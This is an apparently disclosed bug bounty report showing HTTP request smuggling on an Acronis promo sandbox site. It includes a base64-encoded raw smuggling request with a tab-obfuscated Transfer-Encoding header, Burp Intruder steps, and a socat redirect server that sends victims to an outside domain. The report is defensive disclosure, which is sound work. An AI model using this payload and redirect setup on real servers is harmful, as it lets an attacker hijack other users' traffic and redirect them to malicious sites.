# HTTP Request Smuggling on https://promosandbox.acronis.com

## Report Details
- **Report ID**: 1063493
- **URL**: https://hackerone.com/reports/1063493
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-12-21T16:29:00.761Z
- **Disclosed**: 2021-11-16T14:40:37.386Z

## Reporter
- **Username**: riramar
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
## Summary
The website https://promosandbox.acronis.com is vulnerable to HTTP Request Smuggling which can be abused by an attacker to redirect all the users to a malicious website.
A redirect can be forced by changing the Host request header using the path /sf but the website will redirect you to http://pqp.mx:443/sf/.
{F1124353}
The problem is using port 443 over HTTP sometimes will force the browser to redirect to HTTPS (https://pqp.mx:443/sf/) which means a TLS service under the same port.
Instead of create a service which would identify the protocol HTTP or HTTPS I just redirect the user again to https://pqp.mx:8443 where I'm running a HTTPS website. To redirect the user I'm using the socat command below.

```
socat -v -d -d TCP-LISTEN:443,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Content-Length: 0";/bin/echo "Location: https://pqp.mx:8443";/bin/echo;/bin/echo'
```

To reproduce the attack use the configuration below in a Burp Intruder attack. Notice the header "Transfer-Encoding	:	chunked" is not using space but a tab. You can also use the base64 decoded form of this string below.
The size of 93 bytes in hex on the request body must match with the size the second POST request. If you change the "Host: 7hpyu4al44k3lsnmuzfzyuyzaqgg45.burpcollaborator.net" header you need to update the size.

```
UE9TVCAvP2NiPTU0NzU3MDg0NzI0MzQ5NTkgSFRUUC8xLjENClRyYW5zZmVyLUVuY29kaW5nCToJY2h1bmtlZA0KSG9zdDogcHJvbW9zYW5kYm94LmFjcm9uaXMuY29tDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNzguMC4zOTA0Ljg3IFNhZmFyaS81MzcuMzYNCkNvbnRlbnQtdHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpDb250ZW50LWxlbmd0aDogNA0KDQo5Mw0KUE9TVCAvc2YgSFRUUC8xLjENCkhvc3Q6IDdocHl1NGFsNDRrM2xzbm11emZ6eXV5emFxZ2c0NS5idXJwY29sbGFib3JhdG9yLm5ldA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA5DQoNCg0KMA0KDQo=
```

{F1124373}
{F1124374}
{F1124375}
{F1124376}

As soon as you start the Burp Intruder attack above you will see some redirects to Burp Collaborator domain.

{F1124380}

Doing the redirect mentioned above using my own pqp.mx domain I was able to receive some connections.

{F1124384}

## Recommendations
- https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142
- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- https://portswigger.net/web-security/request-smuggling
- https://blog.detectify.com/2020/05/28/hiding-in-plain-sight-http-request-smuggling/

## Impact

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
In this PoC I was able to massive redirect users to a domain under my control but other scenarios are also possible like the ones described here https://portswigger.net/web-security/request-smuggling/exploiting.

## Attachments
- redirect.png
- Intruder_2.png
- Intruder_1.png
- Intruder_4.png
- Intruder_3.png
- attack.png
- ips.png
